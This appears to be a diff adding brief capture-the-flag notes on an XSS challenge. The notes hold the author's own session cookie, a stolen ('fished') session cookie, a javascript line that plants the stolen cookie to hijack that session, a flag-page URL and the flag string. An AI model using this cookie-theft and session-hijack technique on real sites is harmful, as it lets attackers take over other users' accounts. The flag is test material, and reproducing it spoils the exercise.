@@ -1,0 +1,12 @@
+xss
+own cookies backup:
+PHPSESSID=s%3AvIm8c8NJbBxDN8mdB7jNh-tpvwG9lXqr.eLJL1nSuZKzMSJ8eRhRiHPV9inve5zNr%2F79dz3vS47I; _ga=GA1.2.2010180223.1439584256
+
+fished cookies:
+PHPSESSID=s:cqb3vWNwKdbgJWzR0kOiDwiyg09JHojh.IiS3dMTJEVz7G2buSjMp8CRipOq0HrrIzeu2QQWvllU:http://localhost:3000/post/nLMsU1rD6V0uaEWoon-b6K4mthWMQOtQ/the
+
+Insert cookie:
+void(document.cookie="PHPSESSID=s:cqb3vWNwKdbgJWzR0kOiDwiyg09JHojh.IiS3dMTJEVz7G2buSjMp8CRipOq0HrrIzeu2QQWvllU")
+
+http://wiki.icec.tf/post/PtPXxwi6gHCex5efsCeUKwF9sZNso41PUO0FruMBm0M/Flag
+flag_xss_all_the_things
